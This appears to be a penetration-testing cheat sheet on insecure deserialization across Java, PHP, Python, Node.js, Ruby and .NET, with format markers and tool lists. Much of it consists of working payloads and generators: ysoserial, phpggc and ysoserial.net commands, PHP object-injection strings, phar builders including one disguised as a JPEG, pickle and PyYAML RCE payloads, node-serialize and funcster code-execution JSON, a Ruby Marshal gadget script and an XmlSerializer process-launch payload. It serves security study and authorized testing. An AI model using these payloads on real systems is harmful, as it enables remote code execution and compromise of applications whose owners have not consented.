entries.title: What it is and where to look
entries.body:
Serialization is turning an object into a format that can be stored or transmitted; deserialization is the reverse process of reconstructing an object from data. Insecure deserialization occurs when an application reconstructs an object from user-controlled data without validation.
• Look for serialized data in cookies, hidden form fields, headers, parameters, session/auth tokens.
• First recognize the format by magic bytes/markers (see the table), then determine the language/library.
• Data often arrives in Base64 (sometimes + gzip) - decode it and look at the first bytes.
• The escalation goal is RCE via POP chains (gadget chains); sometimes swapping a type/value is enough to bypass authentication.

entries.title: Magic bytes and markers by language

rows: Usually inside hidden fields next to HTML forms
Decode Base64 and look for a long sequence of FF FF FF FF
Decode Base64 and check the first bytes
Prefixes O:, a:, s:, i:, b: and length indicators
Decode Base64 and look for \x04\x08 at the start

entries.title: What a POP gadget is
entries.body:
POP (Property Oriented Programming) gadget is a piece of code in an application class that gets invoked during deserialization.
Characteristics of a POP gadget:
• The class can be serialized.
• It has public/accessible properties.
• It implements specific vulnerable methods (magic methods).
• It has access to other callable classes.
A chain of such gadgets (gadget chain) leads from the deserialization entry point to a dangerous call (exec/eval/system).

entries.title: Practice labs
entries.body:
PortSwigger Web Security Academy:
• Modifying serialized objects
• Modifying serialized data types
• Using application functionality to exploit insecure deserialization
• Arbitrary object injection in PHP
• Exploiting Java deserialization with Apache Commons
• Exploiting PHP deserialization with a pre-built gadget chain
• Exploiting Ruby deserialization using a documented gadget chain
• Developing a custom gadget chain for Java deserialization
• Developing a custom gadget chain for PHP deserialization
• Using PHAR deserialization to deploy a custom gadget chain
Also: NickstaDB/DeserLab (github.com/NickstaDB/DeserLab).

entries.title: Recognizing Java serialization
entries.body:
• "AC ED 00 05" in Hex:
    AC ED - STREAM_MAGIC, the serialization protocol marker.
    00 05 - STREAM_VERSION, the serialization version.
• "rO0" in Base64.
• Content-Type = "application/x-java-serialized-object".
• "H4sIAAAAAAAAAJ" in gzip(base64).

entries.title: ysoserial - generating payloads
entries.body:
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64

entries.title: ysoserial - what it is
entries.body: frohoff/ysoserial (github.com/frohoff/ysoserial) is a PoC tool for generating payloads that exploit insecure deserialization of Java objects. You pick a ready-made gadget chain (depends on the libraries in the target's classpath) and a command to execute.

entries.title: Gadget chains in ysoserial and their dependencies

rows: javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21

entries.title: URLDNS - detection via DNS without gadgets in the classpath
entries.body:
URLDNS does not require vulnerable libraries in the classpath - it works on a plain JDK and makes a DNS request during deserialization. Ideal for blind confirmation of the vulnerability (out-of-band): substitute your own domain and listen for DNS.
java -jar ysoserial.jar URLDNS http://your-collab-domain > payload.bin

entries.title: Burp extensions based on ysoserial
entries.body:
• NetSPI/JavaSerialKiller - Burp extension for Java Deserialization attacks.
• federicodotta/Java-Deserialization-Scanner - all-in-one plugin for detecting and exploiting Java deserialization.
• summitt/burp-ysoserial - integration of ysoserial with Burp Suite.
• DirectDefense/SuperSerial - identifying deserialization vulnerabilities.
• DirectDefense/SuperSerial-Active - active identification of the vulnerability (Burp Extender).

entries.title: Alternative tools for Java deserialization
entries.body:
• pwntester/JRE8u20_RCE_Gadget - pure JRE 8 RCE gadget.
• joaomatosf/JexBoss - verification and exploitation of JBoss and other Java deserializations.
• pimps/ysoserial-modified - a fork of the original ysoserial.
• NickstaDB/SerialBrute - Java serialization brute-force tool.
• NickstaDB/SerializationDumper - dumps Java serialized streams into a readable form.
• bishopfox/gadgetprobe - brute-forces the remote classpath via deserialization.
• k3idii/Deserek - Java-format serialization/deserialization in Python.
• mbechler/marshalsec - Java Unmarshaller Security: turning data into code execution.

entries.title: Deserek - converting a Java stream into Python
entries.body:
java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
python deserek.py yss_base.bin --format python > yss_url.py
python yss_url.py yss_new.bin
java -cp JavaSerializationTestSuite DeSerial yss_new.bin

entries.title: marshalsec - exploiting unmarshallers

rows: JDK only escalation to Java serialization; various third party libraries RCEs
possible JDK only RCE, various third party RCEs

entries.title: Jackson - detecting Polymorphic Type Handling
entries.body:
Jackson is a popular Java library for working with JSON. jackson-databind supports Polymorphic Type Handling (PTH, formerly Polymorphic Deserialization), disabled by default.
To find out that the backend uses Jackson, send invalid JSON and study the error - look for mentions of com.fasterxml.jackson.databind or org.codehaus.jackson.map.
Example message:
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object

entries.title: Jackson CVE-2017-7525 - TemplatesImpl
Jackson CVE-2017-17485 - FileSystemXmlApplicationContext (Spring)
Jackson CVE-2019-12384 - logback H2 RUNSCRIPT
Jackson CVE-2020-36180 - commons-dbcp2 H2 RUNSCRIPT
Jackson CVE-2020-9548 - AnterosDBCPConfig (OOB LDAP)
SnakeYAML - RCE via ScriptEngineManager
ViewState (JSF) - general information
entries.body:
ViewState is a mechanism used by frameworks such as JavaServer Faces (JSF) to store the state of UI components between HTTP requests. Two main implementations: Oracle Mojarra (the JSF reference implementation) and Apache MyFaces.
Tools:
• joaomatosf/jexboss - verification and exploitation of JBoss / Java deserializations.
• Synacktiv-contrib/inyourface - patching unencrypted and unsigned JSF ViewStates.

entries.title: ViewState - state saving method
entries.body:
The javax.faces.STATE_SAVING_METHOD parameter in JSF defines how the framework stores the component tree between requests. The storage method can be inferred from the viewstate representation in the HTML:
• Server side: value="-XXX:-XXXX".
• Client side: base64 + gzip + Java Object.

entries.title: ViewState (MyFaces) - encryption and shared secrets
entries.body:
By default MyFaces uses DES for encryption and HMAC-SHA1 for ViewState authentication (AES + HMAC-SHA256 is recommended). The algorithms and secrets are set in context parameters:
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
<param-name>org.apache.myfaces.SECRET</param-name>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>

Shared secrets from the documentation (name -> value):
AES CBC/PKCS5Padding -> NzY1NDMyMTA3NjU0MzIxMA==
DES -> NzY1NDMyMTA=<
DESede -> MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz
Blowfish -> NzY1NDMyMTA3NjU0MzIxMA
AES CBC -> MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz
AES CBC IV -> NzY1NDMyMTA3NjU0MzIxMA==

Order of operations:
• Encryption: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
• Decryption: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data

entries.title: Recognizing PHP serialization and magic methods
entries.body:
Format: O: (object), a: (array), s: (string), i: (int), b: (bool) + length indicators. No Hex AC...; it starts with O:, a:, s: etc. (Base64 marker Tz).
Magic methods useful for PHP Object Injection (triggered during deserialization/the object lifecycle):
• __wakeup() - on object deserialization.
• __destruct() - on object destruction.
• __toString() - when the object is cast to a string.
Also see the phar:// wrapper (see File Inclusion) - it triggers object injection too.

entries.title: Vulnerable code - unserialize() + __wakeup()/eval()
entries.body:
inject)){ eval($this->inject); } } } if(isset($_REQUEST['r'])){ $var1=unserialize($_REQUEST['r']); if(is_array($var1)){ echo "
".$var1[0]." - ".$var1[1]; } } else{ echo ""; # nothing happens here } ?>

entries.title: Basic serialized data (array)
entries.body: a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

entries.title: Command execution via PHPObjectInjection
entries.body: string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"

entries.title: Authentication bypass via Type Juggling
Object Injection - replacing a value via the R: reference
Finding POP chains (PHP POP Chains)
entries.body:
POP chains in PHP lead to RCE.
• In the source, look for a call to unserialize().
• Study magic methods as entry points/links: __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __serialize(), __unserialize(), __toString(), __invoke(), __set_state(), __clone(), __debugInfo().
• The key ones: __wakeup() (on unserialize), __destruct() (on destruction), __toString() (on cast to a string) - they are called automatically and often start the chain.

entries.title: phpggc - generator of ready-made POP chains
entries.body:
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini

entries.title: phpggc - supported frameworks
entries.body:
ambionics/phpggc (github.com/ambionics/phpggc) generates payloads based on several frameworks:
• Laravel
• Symfony
• SwiftMailer

entries.title: Phar Deserialization - the concept
entries.body:
Through the phar:// wrapper you can trigger deserialization of the archive's metadata when accessing a file, e.g. file_get_contents("phar://./archives/app.phar"). Deserialization happens even without an explicit unserialize() - a file operation on the phar is enough.
A valid PHAR consists of 4 parts:
1. Stub - a piece of PHP code, executed on access in an executable context; at minimum it must end with __HALT_COMPILER();. There are no other restrictions on the stub's content.
2. Manifest - metadata about the archive and its contents.
3. File Contents - the archive's files themselves.
4. Signature (optional) - for integrity verification.

entries.title: Creating a Phar to exploit PDFGenerator
entries.body:
<?php
class PDFGenerator { }

//Create a new instance of the Dummy class and modify its property
$dummy = new PDFGenerator();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

/* Add a new file in the archive with "text" as its content*/
$poc["file"] = "text";
// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);
// Stop buffering and write changes to disk
$poc->stopBuffering();
?>

entries.title: Phar with a JPEG header (bypassing file-type checks)
entries.body:
<?php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();

entries.title: Recognition and sinks (pickle/jsonpickle)
entries.body:
Pickle: magic bytes 80 04 95 (Base64 marker gASV); in text you see opcodes like (lp0, S'Test'.
In Python source, look for dangerous sinks:
• cPickle.loads
• pickle.loads
• _pickle.loads
• jsonpickle.decode
Tool for generating payloads: j0lt-github/python-deserialization-attack-payload-generator - supports pickle, PyYAML, ruamel.yaml, jsonpickle.

entries.title: Pickle - generating an auth token (vulnerable scheme)
entries.body:
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)

entries.title: Pickle - loading the token from user input (sink)
entries.body:
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)

entries.title: Pickle - RCE via __reduce__ (os.system)
Pickle - universal payload via eval (Python 3)
Pickle - code injection techniques inside __reduce__
entries.body:
__import__('os').system('whoami') # Reflected RCE
getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
__include__("os").popen("id && sleep 5").read() # Time-Based RCE

!!python/object/apply:subprocess.Popen
- ls

entries.title: PyYAML - reading a file via str + exec
entries.body:
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec

entries.title: PyYAML - vulnerable sinks after version 6.0
entries.body:
Starting with PyYAML 6.0, the default loader for load was switched to SafeLoader, which lowers the RCE risk. Now the vulnerable sinks are yaml.unsafe_load and yaml.load(input, Loader=yaml.UnsafeLoader):
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)

entries.title: Recognition and sinks (node-serialize/funcster)
entries.body:
In Node source, look for the use of vulnerable serialization libraries:
• node-serialize
• serialize-to-js
• funcster
The node-serialize marker in data is the presence of _$$ND_FUNC$$_ in values (a serialized function).

entries.title: node-serialize CVE-2017-5941 - the gist of the vulnerability
entries.body: A vulnerability in the node-serialize 0.0.4 package for Node.js: untrusted data passed to the unserialize() function allows arbitrary code execution via a JavaScript object with an immediately invoked function expression (IIFE) - by adding () at the end of the serialized function.

entries.title: node-serialize - generating a serialized payload
node-serialize - payload with IIFE () for execution
entries.body: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}

entries.title: funcster - payload via __js_function
entries.body: {"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}

entries.title: Recognizing Ruby serialization (Marshal/YAML)
entries.body:
Marshal: magic bytes 04 08 (Base64 marker BAgK); decode Base64 and look for \x04\x08 at the start.
Ruby also deserializes via YAML (YAML.load) and JSON. The main dangerous points are Marshal.load and YAML.load on untrusted data.

entries.title: Marshal - script to generate and verify the gadget chain
entries.body:
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)

entries.title: YAML - vulnerable code (YAML.load)
entries.body:
require "yaml"
YAML.load(File.read("p.yml"))

entries.title: YAML - universal gadget (ruby <= 2.7.2)
entries.body:
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:

entries.title: Example BinaryFormatter Base64 payload
entries.body: AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=

entries.title: ysoserial.net / ysonet - generating payloads
entries.body:
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t

entries.title: ysoserial.net / ysonet - what it is
entries.body:
Deserialization payload generators for various .NET formatters:
• pwntester/ysoserial.net (github.com/pwntester/ysoserial.net)
• irsdl/ysonet (github.com/irsdl/ysonet) - identical syntax, the same command works by replacing ysoserial.exe with ysonet.exe.
Key flags: -f formatter, -g gadget, -c command, -o output format (raw/base64), -t test.

entries.title: .NET Native Formatters - map of formatters and gadgets

meta.caption: .NET Native Formatters (pwntester/attacking-net-serialization): for each formatter - the output format (Binary/XML/JSON/SOAP/Text), whether type control is required (expected Type), and which gadgets are applicable (ISerializable / Setters). BinaryFormatter, NetDataContractSerializer, SoapFormatter, ObjectStateFormatter, LosFormatter, BinaryMessageFormatter - ISerializable gadgets; DataContractSerializer, XmlSerializer, JavaScriptSerializer, DataContractJsonSerializer, XmlMessageFormatter - Setters gadgets when the type is controlled. Source: PayloadsAllTheThings.

entries.title: XmlSerializer - where to look and payload (ObjectDataProvider)
entries.body:
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>

entries.title: DataContractSerializer - where to look
entries.body:
DataContractSerializer deserializes in a loosely coupled way: it never reads the CLR type and assembly names from the input data. Its security model is similar to XmlSerializer.
• In C# source, look for DataContractSerializer(typeof(<TYPE>)).
• Payload output: XML.
• For exploitation the data type (Type) must be controlled by the user.

entries.title: NetDataContractSerializer - where to look and payload
entries.body:
In C# source, look for NetDataContractSerializer().ReadObject(). Payload output: XML. Serializes any type with the [Serializable] attribute like BinaryFormatter.
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

entries.title: LosFormatter - payload
entries.body:
// Internally uses BinaryFormatter.
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

entries.title: JSON.NET - where to look and payload (ObjectDataProvider)
BinaryFormatter - where to look and payload
entries.body:
In C# source, look for System.Runtime.Serialization.Binary.BinaryFormatter. For exploitation you need [Serializable] or the ISerializable interface. Payload output: Binary. (BinaryFormatter is insecure by design and cannot be made safe.)
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t

entries.title: .NET POP gadgets - properties and popular classes
entries.body:
Gadgets must have: serializability; public/settable variables; magic functions (Get/Set, OnSerialisation, constructors/destructors). The gadget is chosen for a specific formatter.
Popular gadgets:
• ObjectDataProvider (PresentationFramework.dll) - MethodParameters sets the parameters, MethodName invokes an arbitrary function.
• ExpandedWrapper - specifies the types of the encapsulated objects: ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
• System.Configuration.Install.AssemblyInstaller - executes the payload via Assembly.Load (set_Path -> Assembly.LoadFrom(value)).
